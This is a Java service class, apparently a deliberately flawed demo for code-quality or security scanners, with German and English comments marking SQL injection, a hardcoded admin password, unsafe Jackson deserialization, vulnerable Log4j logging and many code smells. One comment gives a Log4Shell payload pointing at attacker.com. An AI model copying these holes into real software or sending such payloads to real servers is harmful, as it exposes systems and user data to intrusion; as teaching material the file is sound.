package com.example.ecommerce.service;

import java.sql.*;
import java.util.*;
import java.io.*;
import com.example.ecommerce.model.User;
import com.example.ecommerce.repository.OrderRepository;

// ❌ VULNERABLE DEPENDENCIES IN USE
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.commons.collections.map.HashedMap;
import org.springframework.web.util.UriUtils;

/**
 * User service for managing users
 * TODO: Add proper error handling
 */
public class UserService {
    
    // ❌ VULNERABLE: Log4j 2.14.1 (Log4Shell CVE-2021-44228)
    private static final Logger logger = LogManager.getLogger(UserService.class);
    
    // ❌ VULNERABLE: Jackson 2.9.8 - unsichere Deserialisierung
    private ObjectMapper objectMapper = new ObjectMapper();
    
    // ❌ DEPRECATED: Apache Commons Collections 3.x
    private Map legacyCache = new HashedMap();
    
    private Connection connection;
    private OrderRepository orderRepository;
    private String adminPassword = "admin123"; // Hardcoded credential - Security Hotspot
    
    public UserService(OrderRepository orderRepository) {
        this.orderRepository = orderRepository;
        // Circular dependency wird hier initiiert
        orderRepository.setUserService(this);
    }
    
    // SQL Injection Vulnerability
    public User getUserByEmail(String email) throws SQLException {
        // ❌ VULNERABLE: Log4Shell - User input wird direkt geloggt!
        // Ein Angreifer könnte ${jndi:ldap://attacker.com/evil} als Email senden
        logger.info("Looking up user with email: " + email);
        
        Statement stmt = connection.createStatement();
        String query = "SELECT * FROM users WHERE email = '" + email + "'";
        ResultSet rs = stmt.executeQuery(query);
        
        if (rs.next()) {
            User user = new User();
            user.setId(rs.getInt("id"));
            user.setEmail(rs.getString("email"));
            user.setPassword(rs.getString("password")); // Storing plaintext password
            
            // ❌ VULNERABLE: Unsichere Deserialisierung möglich
            legacyCache.put(user.getEmail(), user);
            
            return user;
        }
        return null;
        // Resource leak - ResultSet und Statement nicht geschlossen
    }
    
    // Cognitive Complexity zu hoch
    public boolean validateAndProcessUser(User user, String action) {
        if (user != null) {
            if (user.getEmail() != null) {
                if (user.getEmail().contains("@")) {
                    if (action.equals("create")) {
                        if (user.getPassword() != null) {
                            if (user.getPassword().length() >= 8) {
                                if (user.getAge() >= 18) {
                                    if (user.getCountry() != null) {
                                        if (user.getCountry().equals("DE") || user.getCountry().equals("AT")) {
                                            return true;
                                        } else if (user.getCountry().equals("CH")) {
                                            if (user.getCantonCode() != null) {
                                                return true;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } else if (action.equals("update")) {
                        if (user.getId() > 0) {
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }
    
    // Code Duplication - ähnlicher Code wie oben
    public boolean validateUserForRegistration(User user) {
        if (user != null) {
            if (user.getEmail() != null) {
                if (user.getEmail().contains("@")) {
                    if (user.getPassword() != null) {
                        if (user.getPassword().length() >= 8) {
                            if (user.getAge() >= 18) {
                                return true;
                            }
                        }
                    }
                }
            }
        }
        return false;
    }
    
    // Potential NullPointerException
    public String getUserFullName(int userId) {
        User user = findUserById(userId);
        return user.getFirstName() + " " + user.getLastName(); // user könnte null sein
    }
    
    private User findUserById(int userId) {
        // Manchmal null zurückgeben
        if (userId < 0) {
            return null;
        }
        return new User();
    }
    
    // Dead Code - wird nie aufgerufen
    private void unusedMethod() {
        System.out.println("This method is never called");
    }
    
    // Magic Numbers
    public boolean isEligibleForDiscount(User user) {
        if (user.getTotalOrders() > 10 && user.getTotalSpent() > 500.00) {
            return true;
        }
        if (user.getAge() > 65 || user.getAge() < 25) {
            return true;
        }
        return false;
    }
    
    // Exception wird verschluckt (Empty Catch Block)
    public void updateUserProfile(User user) {
        try {
            // Datenbankoperation
            PreparedStatement stmt = connection.prepareStatement(
                "UPDATE users SET first_name = ?, last_name = ? WHERE id = ?"
            );
            stmt.setString(1, user.getFirstName());
            stmt.setString(2, user.getLastName());
            stmt.setInt(3, user.getId());
            stmt.executeUpdate();
            
            logger.info("Updated user profile for: " + user.getEmail());
        } catch (SQLException e) {
            // Exception wird ignoriert - sehr problematisch!
        }
    }
    
    // ❌ VULNERABLE: Jackson Deserialization Attack möglich
    // Keine Type-Validierung bei der Deserialisierung!
    public User deserializeUser(String jsonData) {
        try {
            // enableDefaultTyping() macht dies besonders gefährlich
            objectMapper.enableDefaultTyping();
            return objectMapper.readValue(jsonData, User.class);
        } catch (Exception e) {
            logger.error("Failed to deserialize user data: " + jsonData);
            return null;
        }
    }
    
    // Fehlende equals() bei überschriebenem hashCode()
    @Override
    public int hashCode() {
        return 42;
    }
    
    // Ineffiziente String-Konkatenation in Schleife
    public String generateUserReport(List<User> users) {
        String report = "";
        for (User user : users) {
            report += "User: " + user.getEmail() + "\n";
            report += "Orders: " + user.getTotalOrders() + "\n";
            report += "---\n";
        }
        return report;
    }
    
    // Mutable static field
    public static List<String> bannedEmails = new ArrayList<>();
    
    // Synchronized auf Collection-Typ
    public void addBannedEmail(String email) {
        synchronized(bannedEmails) {
            bannedEmails.add(email);
        }
    }
    
    // Parameter reassignment - schlechte Praxis
    public double calculateDiscount(double price, User user) {
        if (user.isPremium()) {
            price = price * 0.9; // Parameter wird überschrieben
        }
        if (user.getTotalOrders() > 10) {
            price = price * 0.95;
        }
        return price;
    }
    
    // Zu lange Methode mit zu vielen Parametern
    public void createUserWithDetails(String email, String password, String firstName, 
                                     String lastName, String street, String city, 
                                     String zipCode, String country, int age, 
                                     String phone, String mobile, boolean newsletter,
                                     boolean terms, String referralCode) {
        // Sehr lange Parameterliste - Code Smell
        User user = new User();
        user.setEmail(email);
        user.setPassword(password);
        // ... etc
    }
    
    // Fehlende Null-Checks bei Array-Zugriff
    public String getFirstOrderProduct(User user) {
        String[] products = user.getOrderHistory();
        return products[0]; // Könnte ArrayIndexOutOfBoundsException werfen
    }
    
    // Boolean-Parameter (Flag Argument) - Anti-Pattern
    public void processUser(User user, boolean isAdmin) {
        if (isAdmin) {
            // Admin-Logik
        } else {
            // Normal user Logik
        }
    }
    
    // Commented-out Code
    public void deleteUser(int userId) {
        // PreparedStatement stmt = connection.prepareStatement("DELETE FROM users WHERE id = ?");
        // stmt.setInt(1, userId);
        // stmt.executeUpdate();
        
        System.out.println("User deletion not implemented yet");
    }
}
